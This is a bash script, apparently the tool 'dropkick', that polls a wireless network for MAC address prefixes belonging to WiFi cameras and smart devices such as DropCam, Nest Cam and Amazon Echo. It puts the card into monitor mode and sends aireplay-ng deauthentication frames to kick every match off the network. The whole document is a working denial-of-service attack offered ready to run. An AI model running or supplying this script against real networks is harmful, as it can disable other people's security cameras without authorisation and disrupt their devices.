shopt -s nocasematch # Set shell to ignore case
shopt -s extglob # For non-interactive shell.

readonly NIC=$1 # Your wireless NIC
readonly BSSID=$2 # Network BSSID
readonly MAC=$(/sbin/ifconfig | grep $NIC | head -n 1 | awk '{ print $5 }')
# MAC=$(ip link show "$NIC" | awk '/ether/ {print $2}') # If 'ifconfig' not present.
# Match against DropCam, Withings, Axis, Xiaomi, Lorex, Samsung Techwin, Amazon Echo and Nest Cam
readonly GGMAC='@(30:8C:FB*|00:24:E4*|00:40:8C*|58:70:C6*|00:1F:54*|00:09:18*|74:C2:46*|A0:02:DC*|84:D6:D0*|18:B4:30*)' 
readonly POLL=30 # Check every 30 seconds
readonly LOG=/var/log/dropkick.log

airmon-ng stop mon0 # Pull down any lingering monitor devices
airmon-ng start $NIC # Start a monitor device

while true;
    do  
        for TARGET in $(arp-scan -I $NIC --localnet | grep -o -E \
        '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
           do
               if [[ $TARGET == $GGMAC ]]
                   then
                       # Audio alert
                       beep -f 1000 -l 500 -n 200 -r 2
                       echo "WiFi camera discovered: "$TARGET >> $LOG
                       aireplay-ng -0 1 -a $BSSID -c $TARGET mon0 
                       echo "De-authed: "$TARGET " from network: " $BSSID >> $LOG
                       echo '
                             __              __    _     __          __                      
                         ___/ /______  ___  / /__ (_)___/ /_____ ___/ / 
                        / _  / __/ _ \/ _ \/   _// / __/   _/ -_) _  / 
                        \_,_/_/  \___/ .__/_/\_\/_/\__/_/\_\\__/\_,_/  
                                    /_/
                       '                                        
                    else
                        echo $TARGET": is not a DropCam or Withings device. Leaving alone.."
               fi
           done
           echo "None found this round."
           sleep $POLL
done
airmon-ng stop mon0